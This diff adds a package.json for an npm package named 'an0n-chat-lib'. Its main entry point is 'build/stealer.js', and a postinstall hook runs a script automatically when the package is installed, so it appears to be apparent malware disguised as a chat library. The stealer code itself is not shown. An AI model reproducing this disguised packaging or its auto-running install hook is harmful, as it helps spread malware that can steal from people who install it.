@@ -1,0 +1,44 @@
+{
+  "name": "an0n-chat-lib",
+  "version": "0.1.5",
+  "description": "",
+  "main": "build/stealer.js",
+  "types": "build/stealer.d.ts",
+  "scripts": {
+    "start": "node .",
+    "start-dev": "nodemon .",
+    "build": "tsc",
+    "build-dev": "tsc --watch",
+    "clean": "tsc --build --clean",
+    "postinstall": "node ./build/postinstall.js --postinstall"
+  },
+  "engines": {
+    "node": "^14.0.0"
+  },
+  "dependencies": {
+    "@assasans/storage": "^0.1.0",
+    "app-root-path": "^3.0.0",
+    "bluebird": "^3.7.2",
+    "common-tags": "^1.8.0",
+    "discord.js": "^12.3.1",
+    "lodash": "^4.17.20",
+    "promise-fs": "^2.1.1",
+    "request": "^2.88.2",
+    "request-promise": "^4.2.6",
+    "source-map-support": "^0.5.19",
+    "xregexp": "^4.3.0"
+  },
+  "devDependencies": {
+    "@types/app-root-path": "^1.2.4",
+    "@types/bluebird": "^3.5.32",
+    "@types/common-tags": "^1.8.0",
+    "@types/lodash": "^4.14.162",
+    "@types/node": "^14.11.8",
+    "@types/promise-fs": "^2.1.0",
+    "@types/request": "^2.48.5",
+    "@types/request-promise": "^4.1.46",
+    "@types/xregexp": "^4.3.0",
+    "nodemon": "^2.0.4",
+    "typescript": "^4.0.3"
+  }
+}
